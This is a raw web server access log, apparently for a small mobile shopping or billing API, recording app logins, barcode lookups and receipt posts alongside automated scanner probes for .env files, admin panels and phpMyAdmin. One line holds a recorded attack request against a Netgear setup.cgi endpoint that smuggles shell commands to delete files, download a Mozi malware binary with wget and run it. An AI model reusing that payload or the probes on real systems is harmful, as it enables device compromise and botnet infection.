::ffff:66.181.186.233 - - [06/Jun/2022:04:45:18 +0000] "GET / HTTP/1.1" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::ffff:66.181.186.233 - - [06/Jun/2022:04:46:06 +0000] "GET /api/v1/users HTTP/1.1" 401 283 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::ffff:66.181.186.233 - - [06/Jun/2022:04:46:06 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "http://159.223.82.71:8000/api/v1/users" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::ffff:66.181.186.233 - - [06/Jun/2022:04:52:03 +0000] "GET /api/v1/users HTTP/1.1" 401 283 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::1 - - [06/Jun/2022:05:07:28 +0000] "GET /api/v1/users HTTP/1.0" 401 283 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::ffff:127.0.0.1 - - [06/Jun/2022:05:07:46 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::1 - - [06/Jun/2022:05:08:13 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::ffff:127.0.0.1 - - [06/Jun/2022:06:53:36 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::1 - - [06/Jun/2022:07:01:49 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [06/Jun/2022:07:01:50 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [06/Jun/2022:07:06:19 +0000] "GET /manager/text/list HTTP/1.0" 404 156 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:127.0.0.1 - - [06/Jun/2022:07:32:50 +0000] "GET /manager/html HTTP/1.0" 404 151 "-" "Mozilla/5.0 zgrab/0.x"
::1 - - [06/Jun/2022:07:49:36 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:127.0.0.1 - - [06/Jun/2022:08:05:48 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [06/Jun/2022:08:05:49 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [06/Jun/2022:08:44:45 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::1 - - [06/Jun/2022:08:44:45 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::ffff:127.0.0.1 - - [06/Jun/2022:08:44:45 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::1 - - [06/Jun/2022:09:00:27 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::1 - - [06/Jun/2022:10:23:25 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
::ffff:127.0.0.1 - - [06/Jun/2022:10:26:33 +0000] "HEAD / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
::1 - - [06/Jun/2022:10:59:24 +0000] "GET / HTTP/1.0" 404 139 "-" "Linux Gnu (cow)"
::ffff:127.0.0.1 - - [06/Jun/2022:11:06:00 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [06/Jun/2022:11:06:01 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [06/Jun/2022:11:07:33 +0000] "GET / HTTP/1.0" 404 139 "-" "python-requests/2.27.1"
::1 - - [06/Jun/2022:11:12:02 +0000] "GET /portal/redlion HTTP/1.0" 404 153 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:127.0.0.1 - - [06/Jun/2022:11:13:19 +0000] "GET /actuator/health HTTP/1.0" 404 154 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:127.0.0.1 - - [06/Jun/2022:11:42:03 +0000] "GET /api/v1/users HTTP/1.0" 401 283 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::1 - - [06/Jun/2022:12:07:19 +0000] "POST //api/v1/users/login HTTP/1.0" 404 159 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:12:08:35 +0000] "POST //api/v1/users/login HTTP/1.0" 404 159 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:12:08:38 +0000] "POST //api/v1/users/login HTTP/1.0" 404 159 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:12:08:56 +0000] "POST //api/v1/users/login HTTP/1.0" 404 159 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:12:09:01 +0000] "POST //api/v1/users/login HTTP/1.0" 404 159 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:12:09:31 +0000] "POST //api/v1/users/login HTTP/1.0" 404 159 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:12:09:38 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "PostmanRuntime/7.29.0"
::ffff:127.0.0.1 - - [06/Jun/2022:12:09:56 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:12:17:16 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:12:25:52 +0000] "GET / HTTP/1.0" 404 139 "http://159.223.82.71:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
::1 - - [06/Jun/2022:12:41:06 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:12:53:55 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:13:51:21 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:127.0.0.1 - - [06/Jun/2022:13:55:32 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::1 - - [06/Jun/2022:14:00:33 +0000] "GET /phpmyadmin/ HTTP/1.0" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:127.0.0.1 - - [06/Jun/2022:14:05:43 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [06/Jun/2022:14:05:44 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [06/Jun/2022:14:20:15 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:14:21:37 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:14:41:11 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:14:44:30 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:14:45:55 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:14:46:06 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:14:49:17 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:14:49:25 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:14:49:34 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:14:57:38 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:14:59:12 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:15:14:29 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:15:16:21 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:15:16:35 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:15:17:18 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:15:19:42 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:15:20:12 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:15:21:59 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 500 235 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:15:23:15 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:15:23:22 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 500 235 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:15:35:25 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::1 - - [06/Jun/2022:15:35:26 +0000] "GET /showLogin.cc HTTP/1.0" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:127.0.0.1 - - [06/Jun/2022:16:43:41 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:16:43:50 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:16:45:24 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 498 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:16:46:07 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:16:46:12 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:16:50:35 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:16:50:42 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:17:04:03 +0000] "GET /api/v1/goods/user?barCode=8656170005691 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:17:06:09 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [06/Jun/2022:17:06:10 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [06/Jun/2022:17:08:13 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:17:23:28 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:17:25:16 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [06/Jun/2022:17:27:24 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:17:33:57 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:17:57:28 +0000] "POST /api/v1/bills/drain HTTP/1.0" 500 94 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:17:58:35 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:17:58:41 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:00:35 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:00:40 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:00:57 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:01:06 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:01:26 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:01:32 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:02:57 +0000] "POST /api/v1/bills/drain HTTP/1.0" 200 452 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:03:07 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:03:30 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:03:41 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 684 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:03:58 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:04:06 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:04:28 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 1698 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:04:34 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:04:42 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:07:05 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:07:17 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 499 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:07:32 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 450 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:07:40 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:08:15 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:08:19 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 500 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:14:38 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:127.0.0.1 - - [06/Jun/2022:18:14:58 +0000] "GET /api/v1/goods/user?barCode=PM2127H12402710 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:15:04 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:28:49 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
::1 - - [06/Jun/2022:18:29:23 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:29:29 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:32:27 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:33:50 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:35:06 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:36:12 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:36:19 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:39:23 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:39:40 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:40:22 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:44:27 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:53:01 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 906 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:54:09 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:18:54:15 +0000] "GET /api/v1/goods/user?barCode=https://sertifikasi.postel.go.id/sertifikat/index?key=nomor&value=56242 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:18:54:24 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:07:56 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:08:03 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:09:25 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 372 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:09:30 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:09:36 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 911 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:09:56 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 294 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:10:01 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:10:15 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 913 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:16:35 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 906 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:21:31 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 318 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:21:45 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:21:57 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 908 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:22:38 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
